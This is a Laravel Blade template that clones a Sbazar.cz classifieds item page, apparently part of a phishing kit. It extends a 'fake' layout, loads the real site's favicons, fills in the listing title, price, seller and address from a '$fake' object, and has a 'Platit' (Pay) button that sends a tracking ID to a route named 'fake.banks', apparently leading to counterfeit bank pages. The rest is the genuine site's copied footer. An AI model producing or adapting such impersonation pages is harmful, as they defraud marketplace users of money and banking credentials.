@extends('layouts.fake')

@push('css')
    <link rel="apple-touch-icon" href="https://www.sbazar.cz/static/img/favicons/apple-touch-icon-57x57.png"
          sizes="57x57">
    <link rel="apple-touch-icon" href="https://www.sbazar.cz/static/img/favicons/apple-touch-icon-114x114.png"
          sizes="114x114">
    <link rel="apple-touch-icon" href="https://www.sbazar.cz/static/img/favicons/apple-touch-icon-60x60.png"
          sizes="60x60">
    <link rel="apple-touch-icon" href="https://www.sbazar.cz/static/img/favicons/apple-touch-icon-120x120.png"
          sizes="120x120">
    <link rel="apple-touch-icon" href="https://www.sbazar.cz/static/img/favicons/apple-touch-icon-72x72.png"
          sizes="72x72">
    <link rel="apple-touch-icon" href="https://www.sbazar.cz/static/img/favicons/apple-touch-icon-144x144.png"
          sizes="144x144">
    <link rel="apple-touch-icon" href="https://www.sbazar.cz/static/img/favicons/apple-touch-icon-76x76.png"
          sizes="76x76">
    <link rel="apple-touch-icon" href="https://www.sbazar.cz/static/img/favicons/apple-touch-icon-152x152.png"
          sizes="152x152">
    <link rel="apple-touch-icon" href="https://www.sbazar.cz/static/img/favicons/apple-touch-icon-180x180.png">
    <link rel="icon" type="image/png" href="https://www.sbazar.cz/static/img/favicons/favicon-192x192.png"
          sizes="192x192">
    <link rel="icon" type="image/png" href="https://www.sbazar.cz/static/img/favicons/favicon-160x160.png"
          sizes="160x160">
    <link rel="icon" type="image/png" href="https://www.sbazar.cz/static/img/favicons/favicon-96x96.png" sizes="96x96">
    <link rel="icon" type="image/png" href="https://www.sbazar.cz/static/img/favicons/favicon-32x32.png" sizes="32x32">
    <link rel="icon" type="image/png" href="https://www.sbazar.cz/static/img/favicons/favicon-16x16.png" sizes="16x16">
    <link rel="mask-icon" href="https://www.sbazar.cz/static/img/favicons/safari-pinned-tab.svg" color="#ff0000">
    <link href="{{ asset('css/sbazar.css') }}" rel="stylesheet">
@endpush
@section('content')
    <div class="c-page-loader"></div>
    <div id="page">
        <div class="c-ribbon ob-c-ribbon ob-c-ribbon--sticky">
            <div class="ob-c-ribbon__widget">
                <header aria-label="Hlavička" data-ribbon="56" data-ribbon-height="56" data-ribbon-version="1.11.2"
                        amp-fx="float-in-top" role="banner" class="ribbon ribbon--base">
                    <div class="ribbon__start"><a href="https://www.sbazar.cz/" data-dot="lista_sbazar"
                                                  class="ribbon-service"><img style="height: 24px;"
                                                                              src="{{asset($fake->logo())}}"
                                                                              class="ribbon-service__logo"></a></div>
                    <div id="ribbon__center" class="ribbon__center"></div>
                </header>
            </div>
        </div>
        <div class="c-layout p-uw-item">
            <div class="c-layout__content">
                <div class="p-uw-item__detail">
                    <div class="p-uw-item__detail-in">
                        <div class="p-uw-item__content">
                            <h1 class="p-uw-item__header">{{$fake->title}}</h1>
                            <div class="p-uw-item__gallery"><span class="ob-c-favorite-icon__accessibility-text"
                                                                  tabindex="-1">Inzerát byl odebran z oblíbených.</span>
                                <div class="ob-c-gallery c-gallery"
                                     style="background-image: url('{{asset($fake->img)}}');">
                                    <div class="ob-c-gallery__content">
                                        <div>
                                            <div class="ob-c-carousel ob-c-gallery__carousel">
                                                <div class="ob-c-carousel__content">
                                                    <div class="ob-c-carousel__item">
                                                        <div class="ob-c-carousel__item-content">
                                                            <noscript>
                                                                <img src="" alt=""/></noscript>
                                                        </div>
                                                    </div>
                                                    <div class="ob-c-carousel__item">
                                                        <div class="ob-c-carousel__item-content"><img alt="" sizes="
			(min-width: 1324px) 800px,
			(min-width: 1200px) calc(100vw - 2 * 48px - 32px - 300px),
			(min-width: 1000px) calc(100vw - 2 * 32px - 32px - 300px),
			(min-width: 600px) calc(100vw - 2 * 24px),
			calc(100vw - 2 * 16px)
		" class="ob-c-gallery__img" src="https:" srcset="" alt=""/></noscript></div>
                                                    </div>
                                                    <div class="ob-c-carousel__item">
                                                        <div class="ob-c-carousel__item-content"><img alt="" sizes="
			(min-width: 1324px) 800px,
			(min-width: 1200px) calc(100vw - 2 * 48px - 32px - 300px),
			(min-width: 1000px) calc(100vw - 2 * 32px - 32px - 300px),
			(min-width: 600px) calc(100vw - 2 * 24px),
			calc(100vw - 2 * 16px)
		" class="ob-c-gallery__img">
                                                            <noscript><img
                                                                        src="https://d46-a.sdn.cz/d_46/c_img_QK_j/BzS9OG.jpeg?fl=exf|crr,1.33333,2|res,1024,768,1|wrm,/watermark/sbazar.png,10,10|jpg,80,,1"
                                                                        alt=""/></noscript>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="p-uw-item__detail-main">
                                <div class="p-uw-item__first-line"><span class="c-price p-uw-item__price"><span
                                                class="c-price__title">Cena: </span><b
                                                class="c-price__price">{{$fake->price}}</b><span
                                                class="c-price__currency">&nbsp;<!-- -->Kč</span></span></div>
                                <p class="p-uw-item__description">{{$fake->title}}</p></div>
                            <div class="p-uw-item__detail-infobox"><span class="p-uw-item__detail-info">
<a href="https://www.sbazar.cz/0-vsechny-kategorie/{{$fake->address}}"
   class="p-uw-item__link"
   title="Výpis nabídek z okolí">{{$fake->address}}</a></span><span
                                        class="p-uw-item__detail-info">
<span class="p-uw-item__detail-info__txt"></span></span></div>
                            <div class="c-seller-card">
                                <div class="c-seller-card__box" data-dot="seller">
                                    <div class="c-seller-card__content">
                                        <div class="c-seller-info">
                                            <div class="c-seller-info__box">
                                                <div class="c-seller-info__avatar-box"><a
                                                            href="https://www.sbazar.cz/tomasstasak"
                                                            class="c-avatar c-seller-info__avatar c-seller-info__avatar--link"
                                                            style="background-image:none"><span
                                                                class="c-avatar__initials">{{strtoupper($fake->recipient[0])}}</span></a></div>
                                                <a href="https://www.sbazar.cz/tomasstasak" style="margin-top: 20px;"
                                                   class="c-seller-info__name c-seller-info__name--link">{{$fake->recipient}}</a>
                                                <div class="c-seller-info__date"></div>
                                                <div class="c-seller-info__content">
                                                    <div class="c-seller-card__buttons">
                                                        <form action="{{subRoute('fake.banks')}}">
                                                            <input type="hidden" name="track_id" value="{{$fake->track_id}}">
                                                            <button type="submit"
                                                                    class="atm-button--small--action c-seller-card__send-msg-btn"
                                                                    style="width: 100% !important; margin-top: 20px;"
                                                                    data-dot="send-reply">Platit
                                                            </button>
                                                        </form>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="c-reply-form c-popup c-popup--z-index-level-first c-popup-mobile c-popup-mobile--z-index-level-first">
                                            <div class="c-popup__box c-popup-mobile__box">
                                                <div class="c-popup__header">
                                                    <div class="c-popup__header-content">
                                                        <button type="button" class="c-popup__closer" title="Zavřít">
                                                            <svg role="img" class="atm-icon c-popup__closer-icon">
                                                                <title>
                                                                    Zavřít</title>

                                                            </svg>
                                                        </button>
                                                        <span class="c-popup__title">Poslat zprávu</span></div>
                                                </div>
                                                <div class="c-popup__content c-popup-mobile__content">
                                                    <div class="c-offer-preview">
                                                        <div class="c-offer-preview__content"><span
                                                                    class="c-offer-preview__image"><img
                                                                        src="https://d46-a.sdn.cz/d_46/c_img_QP_v/gbN9Hg.jpeg?fl=exf|res,280,280,3|jpg,80,,1"
                                                                        alt=""></span><span
                                                                    class="c-offer-preview__texts"><span
                                                                        class="c-offer-preview__name">{{$fake->title}}</span><span
                                                                        class="c-price c-offer-preview__price"><b
                                                                            class="c-price__price">{{$fake->price}}</b><span
                                                                            class="c-price__currency">&nbsp;
                                                                        <!-- -->Kč</span></span></span></div>
                                                    </div>
                                                    <form novalidate="" data-dot="form-reply">
                                                        <div>
                                                            <div class="c-widget c-widget-textarea">
                                                                <div><label class="c-widget__label"
                                                                            for="reply-form-message"><span
                                                                                class="c-widget__label__text">Zpráva prodejci</span></label>
                                                                    <div class="c-widget-textarea__wrap"><textarea
                                                                                id="reply-form-message"
                                                                                placeholder="Napište Vaši zprávu ..."
                                                                                class="c-widget-textarea__textarea"
                                                                                rows="6"
                                                                                data-e2e="widget-textarea"
                                                                                aria-required="true"></textarea></div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div>
                                                            <div class="c-widget ">
                                                                <div class="c-widget-email"><label
                                                                            class="c-widget__label"
                                                                            for="reply-form-email"><span
                                                                                class="c-widget__label__text">Váš e-mail</span></label>
                                                                    <div class="c-widget-email__wrap"><input
                                                                                type="email"
                                                                                id="reply-form-email"
                                                                                value=""
                                                                                placeholder="vas@email.cz"
                                                                                class="c-widget-email__input"
                                                                                data-e2e="widget-input-email"
                                                                                aria-required="true">
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="c-reply-form__buttons">
                                                            <button class="atm-button--action c-reply-form__button">
                                                                Odpovědět na nabídku
                                                            </button>
                                                        </div>
                                                    </form>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div>
                                <div class="c-locality">
                                    <div class="c-locality__info">
                                        <div class="c-locality__address">
                                            <svg role="img" class="atm-icon c-locality__loc-icon"></svg>
                                            {{$fake->address}}
                                        </div>
                                        <div class="c-locality__address-spec"> {{$fake->address}}
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="p-uw-item__right-pannel">
                            <div class="c-im-side">
                                <div id="im-side-sticky" class="c-im-side__bnr"></div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="c-im-bottom">
                <div class="c-im-bottom__over" data-width="0" data-height="0">
                    <div class="c-im-bottom__bnr">
                        <div class="c-im-bottom__box">
                            <div class="c-im-bottom__in-wrap">
                                <div id="im-bottom" class="c-im-bottom__in"></div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="c-footer">
                <div class="c-footer__content"><p class="c-footer__top-marking">Symbolem<!-- --> <span
                                class="c-top-mark c-top-mark--inline" data-content="TOP">TOP</span> <!-- -->jsou
                        označeny nabídky,
                        které si uživatelé zaplacením zvýhodnili.<!-- --> <a class="c-footer__link"
                                                                             href="https://napoveda.seznam.cz/tlapky.html">Více
                            informací.</a></p>
                    <div class="c-footer__sbazar-box">
                        <div class="c-footer__logo-part">
                            <svg class="c-logo-sbazar c-footer__logo-sbazar" viewBox="0 0 180 24"
                                 xmlns="http://www.w3.org/2000/svg"><title>Seznam.cz</title>
                                <path class="c-logo-sbazar__s c-footer__logo-sbazar__s"
                                      d="M32.1 2.5C32.6 4.2 33.9 6 30.5 6.3 29.3 6.2 28.1 6.1 25.6 6.2 23.4 6.4 22.9 6.5 21.4 6.9 20.6 7.2 20.6 7.9 21.3 8.3 21.8 8.6 24.1 9.4 26.3 10.2 28.9 11.1 32.8 12.3 34.4 13.5 36.9 15.2 36.7 17.7 35.8 19.2 34.7 20.9 31.5 21.6 27.1 22.4 22.2 23.3 20.4 23.2 16.5 23.3 12.3 23.4 7.4 23.4 3.4 23 -0.6 22.7-0.2 22.1 0.3 21.9 0.6 21.7 2.1 21.8 3.9 21.7 7 21.6 11.7 21.2 15.4 20.8 20.7 20.1 23.6 19.5 25.9 18.2 27.7 17.1 26.7 16 26.4 15.8 25.6 15 22.7 13.8 20.2 12.6 16.5 10.9 13.7 9.4 13 8 12.4 6.9 12.5 5.5 13.9 4.3 15.5 2.9 17.4 2.1 19.9 1.5 22.7 0.9 24.2 0.9 26.4 0.9 28.2 0.8 30.2 0.9 30.5 0.3 31.1-0.6 31.6 0.8 32.1 2.5Z"></path>
                                <path class="c-logo-sbazar__bazar c-footer__logo-sbazar__bazar"
                                      d="M138 14C137.4 13.9 136.7 14 136.2 14.4 135.9 14.6 135.6 14.9 135.5 15.2 135.2 15.8 135.2 16.8 135.7 17.3 136.4 18.3 138.1 18.3 139 17.5 139.4 17.2 139.7 16.7 139.8 16.1 139.8 15.8 139.7 15.5 139.7 15.3 139.4 14.7 138.7 14.1 138 14L138 14ZM179 13.9C179 13.9 179 13.9 179 13.9 179 13.9 179 13.9 179 13.9L179 13.9C179 13.9 179 13.9 179 13.9L179 13.9ZM178.9 13.6C178.9 13.6 178.9 13.6 178.9 13.6 178.9 13.6 178.9 13.6 179 13.6L179 13.6C178.9 13.6 178.9 13.6 178.9 13.6L178.9 13.6ZM156 15.2C156 15.2 156 15.2 156 15.2L156 15.2 156 15.2ZM179.7 13.5C179.7 13.5 179.4 13.3 179.4 13.3 179.2 13.2 178.9 13.1 178.5 12.9 177 12.4 175.1 12.1 172.9 12.5 171.3 12.7 167.9 13 167.9 13 166.6 13.1 164.7 13.1 164 13 163.3 13 162 12.7 162 12.7 162 12.4 162.8 11.9 166.2 10.9 166.2 10.9 171.4 9.4 171.8 9.3 171.9 9.3 175.6 8.4 175.7 6.4 175.8 3.8 172.5 2.8 171.4 2.5 170.5 2.3 169.8 2.2 169 2.2 168.5 2.1 168 2.1 167.5 2.1 166.5 2.1 165.5 2.1 164.6 2.2 164.5 2.3 164.4 2.3 164.2 2.3 163.1 2.4 161.2 2.6 160.8 3.9 160.8 4 160.7 4.1 160.7 4.3 160.4 4.9 160 5.9 160.7 6.5 161.4 7.1 162.4 7 163.1 6.9 163.3 6.9 163.4 6.9 163.5 6.9 164 6.8 164.6 6.8 165.1 6.7 165.6 6.6 166.2 6.6 166.7 6.5 166.7 6.5 166.9 6.5 166.9 6.5 167.5 6.4 168.7 6.4 168.7 6.6 168.7 6.7 168.3 7 167.4 7.3 167.4 7.3 165.5 7.9 164.7 8.2L164.7 8.2C163.9 8.5 163.1 8.7 162.3 9 162.3 9 161.5 9.3 161.5 9.3 160.3 9.7 159.1 10.2 157.9 10.7 157.3 11 156.5 11.3 155.8 11.5 154.8 11.8 152.2 12.4 150.9 12.4 149.5 12.4 147.5 12.3 146.8 11.7 146 11 146.5 10 147.1 9.3 147.9 8.3 149 7.6 149.9 7.1 150.6 6.8 151.4 6.4 152.2 6.2 152.6 6.1 153.6 6.1 153.6 6.1 153.8 6.5 154.3 6.3 155 6.1 155.3 6 155.7 5.8 155.8 5.8 156.1 5.6 157.1 5.1 157.1 4.3 157.1 3.6 156.5 2.8 155.8 2.5 155.3 2.1 154.6 2 153.7 2 152.9 2 152.2 2 151.5 2.1 151 2.1 150.5 2.2 149.9 2.4 149.1 2.6 148.3 2.9 147.5 3.3 146.5 3.8 145.5 4.5 144.7 5.3 144.3 5.6 144 6.1 143.7 6.5 143.3 7 143.1 7.6 142.8 8.3 142.2 10 142.4 12.1 143.3 13.8 143.9 14.9 144.8 15.9 146 16.5 147.4 17.3 149.3 17.6 151.1 17.3 151.8 17.2 154.5 16.3 155 16.1 155.3 15.9 156 15.6 156 15.6 156.1 15.7 156.2 15.9 156.4 16.1 156.6 16.3 156.8 16.5 157.2 16.7 157.9 17.2 158.6 17.3 159.2 17.4 160.8 17.6 162.5 17.7 164.2 17.7 165.4 17.7 166.6 17.6 168.2 17.5 168.9 17.5 169.7 17.4 170.3 17.3 170.3 17.3 170.8 17.2 170.8 17.2 173 17 174.9 16.5 177.1 15.6 178.1 15.2 178.9 14.7 179.5 14 179.5 14 179.7 13.8 179.7 13.8L179.9 13.6 179.7 13.5ZM163.9 13L163.9 13C163.9 13 163.9 13 163.9 13L163.9 13ZM112.6 6.4C112.5 6.1 112.9 5.7 113.2 5.7 115.6 5.5 119.2 5.2 119.7 6 120.7 7.4 112.8 8.1 112.8 8.1 112.8 7.5 112.8 6.9 112.6 6.4L112.6 6.4ZM97.1 10.8C97.2 10.5 98.7 6.7 99.3 6.9 100 7.1 100.5 8.5 101.3 10.1 99.4 10.4 99 10.6 97.1 10.8L97.1 10.8ZM132.3 12.8C131.3 13.4 123 12.8 116.5 10.9 121.4 10.8 124.7 8.6 124.7 6.5 124.7 5.7 124.3 4.1 122.9 3 121.5 1.9 117.8 1.3 112.6 1.4 112.3 1.4 105.5 1.4 105.8 2.3 106.1 3.5 105.7 5.1 106.2 5.8 106.4 6.1 107.2 6 108 5.9 108.8 5.7 108.9 8.5 108.3 8.8 108 9 106.5 9.2 105.4 9.4 105.2 8.9 105 8.5 104.8 8.1 103.2 5.5 101.3 1.8 99.7 1.8 97 1.9 96.6 2.9 95.7 4.2 94.7 5.7 92.4 11.1 92 11.7 89.1 12.2 82.4 13.3 82.4 13.3 81.9 13.5 81.7 13 83.1 12.3 84.5 11.5 89.1 8.7 90.3 7.5 91 6.6 90.8 5.4 90.5 4.5 90.2 3.3 88.3 2.1 85.7 1.8 83.1 1.4 75.7 1 75.3 2.1 75.1 3.1 76.4 5.4 78 5.5 79.5 5.6 82.1 5.8 82.1 5.8 82.6 5.9 84.5 6 84.9 6.2 85.2 6.5 83.5 7.6 81.2 9 78.8 10.4 76.5 12 75.9 12.6 75.2 13.2 75.9 14.8 76.1 15.6 76.3 16.1 76.9 17.2 77.5 17.8 78.3 18.6 82.6 18.1 85 17.8 87.3 17.4 89.8 16.8 90.3 16.8 90.9 16.8 90.4 17.2 90.4 17.7 90.5 18.2 90.7 18.5 91 18.6 91.2 18.7 93.3 18.5 93.8 18.1 94.2 17.8 94.3 17.3 94.4 16.9 94.7 16.1 94.8 15.9 95.2 15.8 96.1 15.7 100.3 14.7 102.2 14.3 104.1 14 103.3 16.2 103.9 16.8 104.6 17.4 106.7 17.8 107.2 17.5 107.4 17.3 107.2 15.4 106.6 13.2 107.5 13.1 108.4 12.9 108.5 13.4 108.5 13.5 108.2 16.8 109 17.5 109.7 18.2 111.8 17.2 112.3 16.3 112.8 15.4 112.5 14.7 112.6 13.6 118.8 16.6 126.5 19.2 130.4 18.1 133.6 17.1 132.2 14.4 132.3 12.8L132.3 12.8ZM69.5 9.3C69.2 9.6 66.5 10 65.5 10.3 65.6 9.6 67.5 6.3 67.8 6.4 68.1 6.5 69.7 8.7 69.5 9.3L69.5 9.3ZM49.5 15C48.4 15.3 45.4 15.8 44.2 15.7 43.4 15.6 43.6 13.8 43.7 13.3L48.5 12.7C48.5 12.7 52.9 12 52.9 13.2 53 13.8 50.7 14.7 49.5 15L49.5 15ZM44.1 6.4C44.5 5.9 45.3 6.1 46 6.1 49.2 6.4 48.5 8 48.5 8 47.9 8.4 43.7 8.9 43.8 8.2L44.1 6.4ZM76.5 10.9C77.1 10.5 77.1 9.4 76.8 8.4 76.5 7.9 75.2 8.5 73.7 8.7 73 8.7 71.8 5.4 71.3 4.4 70.9 3.3 69 0.4 66.9 1 65.8 1.4 65.2 1.8 64.4 2.7 64.3 2.9 62.7 6.2 61.7 8.3 60.8 10.4 60 12.5 60 12.5 59.7 12.2 59.8 11.6 58.5 10.4 57.2 9.1 55.1 8.8 54.9 8.7 56.1 6.4 55.2 4 52.5 2.8 48.3 1 43.1 0.9 41 1.1 38.7 1.3 33.7 2.1 34 2.9 34.3 5.7 34.5 6.8 35.7 6.5 39 5.7 39.5 6.2 39.7 6.2L39.5 7.3C39.5 7.3 37.1 18.8 38.7 20.2 41.4 22.1 50.9 20.1 53.4 19.1 56.1 18.1 57.2 17.3 57.9 16.7 58.1 16.5 59.1 15.7 59.1 15.7 58.7 16.4 57.5 20 58.3 20.1 59 20.3 61 19.8 61.4 19.6 62 19.4 61.9 19.1 62.4 18.2 62.8 17.3 62.7 15.6 64.7 15.2 66.7 14.8 68.7 14.1 70 13.9 71.4 13.8 71.4 15.6 71.5 15.8 72 17.6 72.3 18.2 73.2 18.6 74.2 19.1 76 18.9 76.1 18.5 76.3 17.7 74.6 13.6 74.6 13.4 74.3 12 75.7 11.6 76.5 10.9L76.5 10.9Z"></path>
                            </svg>
                        </div>
                        <ul class="c-footer__links">
                            <li class="c-footer__item"><a class="c-footer__link"
                                                          href="https://napoveda.seznam.cz/cz/sbazar"
                                                          rel="noreferrer" target="_blank">Nápověda</a></li>
                            <li class="c-footer__item"><a class="c-footer__link"
                                                          href="https://napoveda.seznam.cz/cz/stiznost.html"
                                                          rel="noreferrer" target="_blank">Podat stížnost</a></li>
                            <li class="c-footer__item">
                                <button class="c-footer__link">Co říkáte na Sbazar.cz?</button>
                            </li>
                            <li class="c-footer__item"><a class="c-footer__link" href="https://vyzkumnik.seznam.cz/"
                                                          rel="noreferrer" target="_blank">Výzkumník</a></li>
                            <li class="c-footer__item"><a class="c-footer__link"
                                                          href="https://napoveda.seznam.cz/cz/smluvni-podminky/podminky-sbazar-cz"
                                                          rel="noreferrer" target="_blank">Pro spotřebitele</a></li>
                            <li class="c-footer__item">
                                <button class="c-footer__link">Nastavení personalizace</button>
                            </li>
                        </ul>
                        <div class="c-popup c-popup--z-index-level-first c-popup-dialog c-popup-dialog--z-index-level-first">
                            <div class="c-popup__box c-popup-dialog__box">
                                <div class="c-popup__header">
                                    <div class="c-popup__header-content">
                                        <button type="button" class="c-popup__closer" title="Zavřít">
                                            <svg role="img" class="atm-icon c-popup__closer-icon"><title>Zavřít</title>
                                            </svg>
                                        </button>
                                        <span class="c-popup__title">Dotazník</span></div>
                                </div>
                                <div class="c-popup__content c-popup-dialog__content">
                                    <div class="c-feedback"><h2 class="c-feedback__header">Co říkáte na Sbazar.cz?</h2>
                                        <p class="c-feedback__info">Neustále pracujeme na tom, aby byly naše služby
                                            lepší a
                                            lepší. Budeme rádi, když nám dáte vědět, jak se vám Sbazar líbí a co bychom
                                            mohli ještě vyladit.</p>
                                        <form class="c-feedback__form" novalidate="">
                                            <div class="c-feedback__form__content"></div>
                                            <button type="submit" class="atm-button--action c-feedback__submit-button">
                                                Odeslat
                                            </button>
                                        </form>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="c-footer__seo-box">
                        <div class="c-footer__seo-vertical">
                            <div class="c-footer__seo-menu"><h5 class="c-footer__seo-menu-title">Vánoční recepty</h5>
                                <ul class="c-footer__seo-links">
                                    <li class="c-footer__seo-menu-item"><a
                                                href="https://www.stream.cz/video/vanocni-cukrovi"
                                                class="c-footer__seo-menu-link" target="_blank"
                                                rel="noopener noreferrer">Cukroví</a>
                                    </li>
                                    <li class="c-footer__seo-menu-item"><a
                                                href="https://www.stream.cz/video/vanocni-pernicky"
                                                class="c-footer__seo-menu-link" target="_blank"
                                                rel="noopener noreferrer">Vanilkové
                                            rohlíčky</a></li>
                                    <li class="c-footer__seo-menu-item"><a
                                                href="https://www.stream.cz/cuketka-pece/vosi-hnizda-nebo-vceli-uly-oblibene-nepecene-cukrovi-s-naplni-64009821"
                                                class="c-footer__seo-menu-link" target="_blank"
                                                rel="noopener noreferrer">Vosí
                                            hnízda</a></li>
                                    <li class="c-footer__seo-menu-item"><a
                                                href="https://www.stream.cz/cuketka-pece/domaci-vanocka-je-zaklad-uplest-ze-sesti-pramenu-ji-zvladne-kazdy-64002241"
                                                class="c-footer__seo-menu-link" target="_blank"
                                                rel="noopener noreferrer">Vánočka
                                            recept</a></li>
                                    <li class="c-footer__seo-menu-item"><a
                                                href="https://www.stream.cz/cuketka-pece/jak-uplest-vanocku-tenhle-video-navod-vas-to-nauci-jednou-provzdy-64007811"
                                                class="c-footer__seo-menu-link" target="_blank"
                                                rel="noopener noreferrer">Jak
                                            uplést vánočku</a></li>
                                    <li class="c-footer__seo-menu-item"><a
                                                href="https://www.stream.cz/kuchar-vi/jak-vykostit-kapra-284437"
                                                class="c-footer__seo-menu-link" target="_blank"
                                                rel="noopener noreferrer">Porcování
                                            kapra</a></li>
                                    <li class="c-footer__seo-menu-item"><a
                                                href="https://www.stream.cz/cuketka/klasika-ke-smazenemu-kaprovi-tradicni-bramborovy-salat-64002456"
                                                class="c-footer__seo-menu-link" target="_blank"
                                                rel="noopener noreferrer">Bramborový
                                            salát</a></li>
                                    <li class="c-footer__seo-menu-item"><a
                                                href="https://www.stream.cz/cuketka-pece/vosi-hnizda-nebo-vceli-uly-oblibene-nepecene-cukrovi-s-naplni-64009821"
                                                class="c-footer__seo-menu-link" target="_blank"
                                                rel="noopener noreferrer">Vaječný
                                            likér</a></li>
                                </ul>
                            </div>
                            <div class="c-footer__seo-menu"><h5 class="c-footer__seo-menu-title">Bydlení</h5>
                                <ul class="c-footer__seo-links">
                                    <li class="c-footer__seo-menu-item"><a href="https://www.sreality.cz/"
                                                                           class="c-footer__seo-menu-link"
                                                                           target="_blank"
                                                                           rel="noopener noreferrer">Reality</a></li>
                                    <li class="c-footer__seo-menu-item"><a href="https://www.sreality.cz/hledani/byty"
                                                                           class="c-footer__seo-menu-link"
                                                                           target="_blank"
                                                                           rel="noopener noreferrer">Byty</a></li>
                                    <li class="c-footer__seo-menu-item"><a href="https://www.sreality.cz/hledani/domy"
                                                                           class="c-footer__seo-menu-link"
                                                                           target="_blank"
                                                                           rel="noopener noreferrer">Domy</a></li>
                                    <li class="c-footer__seo-menu-item"><a
                                                href="https://www.sreality.cz/hledani/pozemky"
                                                class="c-footer__seo-menu-link" target="_blank"
                                                rel="noopener noreferrer">Pozemky</a></li>
                                    <li class="c-footer__seo-menu-item"><a
                                                href="https://www.sreality.cz/hledani/prodej/byty?stav=novostavby"
                                                class="c-footer__seo-menu-link" target="_blank"
                                                rel="noopener noreferrer">Novostavby</a>
                                    </li>
                                    <li class="c-footer__seo-menu-item"><a href="https://www.sreality.cz/projekt"
                                                                           class="c-footer__seo-menu-link"
                                                                           target="_blank"
                                                                           rel="noopener noreferrer">Developerské
                                            projekty</a></li>
                                    <li class="c-footer__seo-menu-item"><a
                                                href="https://www.sreality.cz/hledani/pronajem/byty/{{$fake->address}}?velikost=pokoj"
                                                class="c-footer__seo-menu-link" target="_blank"
                                                rel="noopener noreferrer">Pronájem
                                            pokoje {{$fake->address}}</a></li>
                                    <li class="c-footer__seo-menu-item"><a
                                                href="https://www.sreality.cz/hledani/prodej/domy/chaty"
                                                class="c-footer__seo-menu-link" target="_blank"
                                                rel="noopener noreferrer">Chata
                                            na prodej</a></li>
                                </ul>
                            </div>
                            <div class="c-footer__seo-menu"><h5 class="c-footer__seo-menu-title">Dovolená</h5>
                                <ul class="c-footer__seo-links">
                                    <li class="c-footer__seo-menu-item"><a href="https://sdovolena.seznam.cz/"
                                                                           class="c-footer__seo-menu-link"
                                                                           target="_blank"
                                                                           rel="noopener noreferrer">Dovolená</a></li>
                                    <li class="c-footer__seo-menu-item"><a href="https://sdovolena.seznam.cz/chorvatsko"
                                                                           class="c-footer__seo-menu-link"
                                                                           target="_blank"
                                                                           rel="noopener noreferrer">Dovolená
                                            Chorvatsko</a>
                                    </li>
                                    <li class="c-footer__seo-menu-item"><a
                                                href="https://sdovolena.seznam.cz/search?lastMinute=1"
                                                class="c-footer__seo-menu-link" target="_blank"
                                                rel="noopener noreferrer">Last
                                            minute</a></li>
                                    <li class="c-footer__seo-menu-item"><a href="https://sdovolena.seznam.cz/egypt"
                                                                           class="c-footer__seo-menu-link"
                                                                           target="_blank"
                                                                           rel="noopener noreferrer">Egypt dovolená</a>
                                    </li>
                                    <li class="c-footer__seo-menu-item"><a href="https://sdovolena.seznam.cz/albanie"
                                                                           class="c-footer__seo-menu-link"
                                                                           target="_blank"
                                                                           rel="noopener noreferrer">Albánie
                                            dovolená</a>
                                    </li>
                                    <li class="c-footer__seo-menu-item"><a
                                                href="https://sdovolena.seznam.cz/chorvatsko?transport=4"
                                                class="c-footer__seo-menu-link" target="_blank"
                                                rel="noopener noreferrer">Chorvatsko
                                            autobusem</a></li>
                                    <li class="c-footer__seo-menu-item"><a href="https://sdovolena.seznam.cz/slovinsko"
                                                                           class="c-footer__seo-menu-link"
                                                                           target="_blank"
                                                                           rel="noopener noreferrer">Slovinsko</a></li>
                                    <li class="c-footer__seo-menu-item"><a href="https://sdovolena.seznam.cz/korsika"
                                                                           class="c-footer__seo-menu-link"
                                                                           target="_blank"
                                                                           rel="noopener noreferrer">Korsika</a></li>
                                </ul>
                            </div>
                            <div class="c-footer__seo-menu"><h5 class="c-footer__seo-menu-title">Práce</h5>
                                <ul class="c-footer__seo-links">
                                    <li class="c-footer__seo-menu-item"><a href="https://www.volnamista.cz/"
                                                                           class="c-footer__seo-menu-link"
                                                                           target="_blank"
                                                                           rel="noopener noreferrer">Volná pracovní
                                            místa</a></li>
                                    <li class="c-footer__seo-menu-item"><a
                                                href="https://www.volnamista.cz/ostrava-mesto"
                                                class="c-footer__seo-menu-link" target="_blank"
                                                rel="noopener noreferrer">Práce Ostrava</a></li>
                                    <li class="c-footer__seo-menu-item"><a href="https://www.volnamista.cz/brno-mesto"
                                                                           class="c-footer__seo-menu-link"
                                                                           target="_blank"
                                                                           rel="noopener noreferrer">Práce Brno</a></li>
                                    <li class="c-footer__seo-menu-item"><a href="https://www.volnamista.cz/plzen-mesto"
                                                                           class="c-footer__seo-menu-link"
                                                                           target="_blank"
                                                                           rel="noopener noreferrer">Práce Plzeň</a>
                                    </li>
                                    <li class="c-footer__seo-menu-item"><a href="https://www.volnamista.cz/zlin"
                                                                           class="c-footer__seo-menu-link"
                                                                           target="_blank"
                                                                           rel="noopener noreferrer">Práce Zlín</a></li>
                                    <li class="c-footer__seo-menu-item"><a href="https://www.volnamista.cz/olomouc"
                                                                           class="c-footer__seo-menu-link"
                                                                           target="_blank"
                                                                           rel="noopener noreferrer">Práce Olomouc</a>
                                    </li>
                                    <li class="c-footer__seo-menu-item"><a
                                                href="https://www.volnamista.cz/{{$fake->address}}/brigada"
                                                class="c-footer__seo-menu-link" target="_blank"
                                                rel="noopener noreferrer">Brigáda
                                            {{$fake->address}}</a></li>
                                    <li class="c-footer__seo-menu-item"><a href="https://www.volnamista.cz/brigada"
                                                                           class="c-footer__seo-menu-link"
                                                                           target="_blank"
                                                                           rel="noopener noreferrer">Brigády</a></li>
                                </ul>
                            </div>
                            <div class="c-footer__seo-menu"><h5 class="c-footer__seo-menu-title">Firmy.cz</h5>
                                <ul class="c-footer__seo-links">
                                    <li class="c-footer__seo-menu-item"><a
                                                href="https://www.firmy.cz/Prvni-pomoc-a-zdravotnictvi/Zdravotnicke-sluzby/Zdravotnicka-zarizeni/Pohotovosti/Zubni-pohotovosti"
                                                class="c-footer__seo-menu-link" target="_blank"
                                                rel="noopener noreferrer">Zubní
